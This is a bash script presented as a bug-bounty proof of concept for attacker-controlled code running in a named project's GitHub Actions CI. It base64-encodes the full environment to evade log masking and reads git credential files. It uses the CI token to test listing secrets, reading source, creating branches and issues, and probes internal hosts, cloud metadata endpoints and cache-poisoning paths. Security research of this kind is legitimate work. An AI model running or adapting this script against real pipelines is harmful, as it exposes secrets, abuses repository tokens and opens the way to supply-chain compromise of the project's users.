#!/bin/bash
# Security Research PoC — Deep CI Environment Analysis
# Researcher: null_consolidated (HackerOne / iFinex Bug Bounty)
# This script proves secret accessibility, token capabilities,
# and internal resource reachability from attacker-controlled code.
# NO secrets are sent to external servers.
# All output stays in CI logs (downloaded via GitHub API).

echo '================================================================'
echo 'SECURITY RESEARCH — Deep CI Exploitation PoC (Round 2)'
echo 'Researcher: null_consolidated (HackerOne)'
echo 'Target: tetherto/miningos-tpl-wrk-miner'
echo 'Purpose: Prove secret exposure, token capabilities, network access'
echo '================================================================'

echo ''
echo '=== PHASE 1: ENVIRONMENT VARIABLE DUMP (base64 to bypass log masking) ==='
echo 'BEGIN_ENV_B64'
printenv | sort | base64 -w0
echo ''
echo 'END_ENV_B64'

echo ''
echo '=== PHASE 2: /proc/self/environ (raw process environment) ==='
echo 'BEGIN_PROC_B64'
cat /proc/self/environ 2>/dev/null | tr '\0' '\n' | sort | base64 -w0
echo ''
echo 'END_PROC_B64'

echo ''
echo '=== PHASE 3: GIT CREDENTIAL FILES ==='
echo 'Searching /github/runner_temp/ for credential files...'
ls -la /github/runner_temp/git-credentials-* 2>/dev/null || echo 'No glob match'
ls -la /home/runner/work/_temp/git-credentials-* 2>/dev/null || echo 'No glob match in _temp'
for f in /github/runner_temp/git-credentials-*.config /home/runner/work/_temp/git-credentials-*.config; do
  if [ -f "$f" ]; then
    echo "FOUND: $f"
    echo "BEGIN_GITCRED_B64_${f##*/}"
    cat "$f" | base64 -w0
    echo ''
    echo "END_GITCRED_B64"
  fi
done

echo ''
echo '=== PHASE 4: GITHUB_TOKEN API CAPABILITIES ==='
echo '--- 4a: Token identity ---'
curl -sf -H "Authorization: token $GITHUB_TOKEN" \
  "https://api.github.com/user" 2>/dev/null | head -c 500
echo ''

echo '--- 4b: Token scopes (from response headers) ---'
curl -sI -H "Authorization: token $GITHUB_TOKEN" \
  "https://api.github.com/repos/tetherto/miningos-tpl-wrk-miner" 2>/dev/null \
  | grep -iE 'x-oauth-scopes|x-accepted-oauth-scopes|x-ratelimit'

echo '--- 4c: Repository permissions object ---'
curl -sf -H "Authorization: token $GITHUB_TOKEN" \
  "https://api.github.com/repos/tetherto/miningos-tpl-wrk-miner" 2>/dev/null \
  | python3 -c "
import sys, json
try:
    d = json.load(sys.stdin)
    print('repo_permissions:', json.dumps(d.get('permissions', {}), indent=2))
    print('private:', d.get('private'))
    print('default_branch:', d.get('default_branch'))
except: pass
" 2>/dev/null

echo '--- 4d: Can we list repo secrets? ---'
SC=$(curl -sf -o /dev/null -w '%{http_code}' -H "Authorization: token $GITHUB_TOKEN" \
  "https://api.github.com/repos/tetherto/miningos-tpl-wrk-miner/actions/secrets" 2>/dev/null)
echo "LIST_SECRETS_HTTP: $SC"

echo '--- 4e: Can we list org repos? ---'
curl -sf -H "Authorization: token $GITHUB_TOKEN" \
  "https://api.github.com/orgs/tetherto/repos?per_page=5&type=all" 2>/dev/null \
  | python3 -c "
import sys, json
try:
    repos = json.load(sys.stdin)
    for r in repos[:5]:
        print('  repo:', r.get('full_name'), '| private:', r.get('private'), '| permissions:', json.dumps(r.get('permissions',{})))
except: pass
" 2>/dev/null

echo '--- 4f: Can we read repo content (source code exfil)? ---'
SC=$(curl -sf -o /dev/null -w '%{http_code}' -H "Authorization: token $GITHUB_TOKEN" \
  "https://api.github.com/repos/tetherto/miningos-tpl-wrk-miner/contents/package.json" 2>/dev/null)
echo "READ_CONTENTS_HTTP: $SC"

echo '--- 4g: Can we create a branch (write test)? ---'
MAIN_SHA=$(curl -sf -H "Authorization: token $GITHUB_TOKEN" \
  "https://api.github.com/repos/tetherto/miningos-tpl-wrk-miner/git/ref/heads/main" 2>/dev/null \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['object']['sha'])" 2>/dev/null)
echo "MAIN_SHA: $MAIN_SHA"
CREATE_BRANCH=$(curl -sf -o /dev/null -w '%{http_code}' -X POST \
  -H "Authorization: token $GITHUB_TOKEN" \
  -H "Content-Type: application/json" \
  "https://api.github.com/repos/tetherto/miningos-tpl-wrk-miner/git/refs" \
  -d "{\"ref\":\"refs/heads/poc-write-test-$(date +%s)\",\"sha\":\"$MAIN_SHA\"}" 2>/dev/null)
echo "CREATE_BRANCH_HTTP: $CREATE_BRANCH"

echo '--- 4h: Can we create an issue? ---'
CREATE_ISSUE=$(curl -sf -o /dev/null -w '%{http_code}' -X POST \
  -H "Authorization: token $GITHUB_TOKEN" \
  -H "Content-Type: application/json" \
  "https://api.github.com/repos/tetherto/miningos-tpl-wrk-miner/issues" \
  -d '{"title":"[AUTOMATED] Security PoC write test — will delete","body":"Benign test."}' 2>/dev/null)
echo "CREATE_ISSUE_HTTP: $CREATE_ISSUE"

echo ''
echo '=== PHASE 5: NETWORK PROBING ==='
echo '--- 5a: Internal SonarQube (Tailscale) ---'
curl -sf --connect-timeout 5 -o /dev/null -w 'SONAR_HTTP: %{http_code}\n' \
  "https://dev-sonarcube-0.tail8a2a3f.ts.net/" 2>/dev/null || echo 'SONAR: UNREACHABLE (no Tailscale VPN)'

echo '--- 5b: DNS resolution of internal hosts ---'
for host in dev-sonarcube-0.tail8a2a3f.ts.net github.com registry.npmjs.org; do
  IP=$(getent hosts "$host" 2>/dev/null | awk '{print $1}' | head -1)
  echo "DNS: $host -> ${IP:-NXDOMAIN}"
done

echo '--- 5c: Cloud metadata endpoints ---'
for url in \
  "http://169.254.169.254/latest/meta-data/" \
  "http://169.254.169.254/computeMetadata/v1/" \
  "http://100.100.100.200/latest/meta-data/"; do
  SC=$(curl -sf --connect-timeout 2 -o /dev/null -w '%{http_code}' "$url" 2>/dev/null || echo '000')
  echo "METADATA: $url -> HTTP $SC"
done

echo ''
echo '=== PHASE 6: CACHE POISONING CAPABILITY ==='
echo '--- 6a: Cached node_modules location ---'
ls -la node_modules/ 2>/dev/null | head -5
echo "node_modules writable: $(test -w node_modules && echo YES || echo NO)"
echo "node_modules owner: $(stat -c '%U:%G' node_modules 2>/dev/null || echo unknown)"

echo '--- 6b: npm cache location ---'
npm config get cache 2>/dev/null
ls -la "$(npm config get cache 2>/dev/null)" 2>/dev/null | head -5

echo '--- 6c: Actions cache paths ---'
ls -la /opt/hostedtoolcache/ 2>/dev/null | head -10
echo "hostedtoolcache writable: $(test -w /opt/hostedtoolcache && echo YES || echo NO)"

echo '--- 6d: Runner temp contents ---'
ls -la /home/runner/work/_temp/ 2>/dev/null | head -15
ls -la /github/runner_temp/ 2>/dev/null | head -15

echo ''
echo '=== PHASE 7: FILESYSTEM & RUNNER DETAILS ==='
echo '--- 7a: Runner user context ---'
id
echo "HOME: $HOME"
echo "RUNNER_WORKSPACE: $RUNNER_WORKSPACE"
echo "GITHUB_WORKSPACE: $GITHUB_WORKSPACE"

echo '--- 7b: Network interfaces ---'
ip addr show 2>/dev/null | grep -E 'inet |link/' | head -10

echo '--- 7c: Running processes (looking for interesting services) ---'
ps aux 2>/dev/null | grep -vE 'grep|ps aux' | head -20

echo '--- 7d: Disk mounts ---'
df -h 2>/dev/null | head -10

echo ''
echo '================================================================'
echo 'END OF DEEP POC — All evidence captured in CI logs'
echo 'No secrets exfiltrated to external servers.'
echo 'Download logs via: GET /repos/tetherto/miningos-tpl-wrk-miner/actions/runs/{run_id}/logs'
echo '================================================================'
